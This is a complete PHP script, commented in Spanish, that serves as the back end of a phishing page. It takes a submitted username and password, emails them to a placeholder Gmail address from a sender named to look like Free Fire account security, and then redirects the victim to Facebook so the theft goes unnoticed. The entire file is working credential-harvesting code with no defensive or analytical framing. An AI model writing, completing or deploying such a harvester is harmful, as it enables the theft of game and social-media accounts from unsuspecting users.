<?php
if(isset($_POST['submit'])){
    // Recibe los datos del formulario
    $usuario = $_POST['usuario'];
    $contrasena = $_POST['contrasena'];
    
    // Dirección de correo electrónico de destino
    $destinatario = 'tudireccion@gmail.com';
    
    // Asunto del correo
    $asunto = 'Inicio de sesión en FreeFire';
    
    // Contenido del correo
    $mensaje = "Usuario: $usuario\nContraseña: $contrasena";
    
    // Cabeceras del correo
    $cabeceras = 'From: segurida.cuentas.freefire@gmail.com' . "\r\n" .
                 'Reply-To: segurida.cuentas.freefire@gmail.com' . "\r\n" .
                 'X-Mailer: PHP/' . phpversion();
    
    // Envía el correo
    if(mail($destinatario, $asunto, $mensaje, $cabeceras)){
        // Redirige a la página de Facebook
        header('Location: https://m.facebook.com/');
        exit;
    } else{
        echo 'Error al enviar el correo.';
    }
}
?>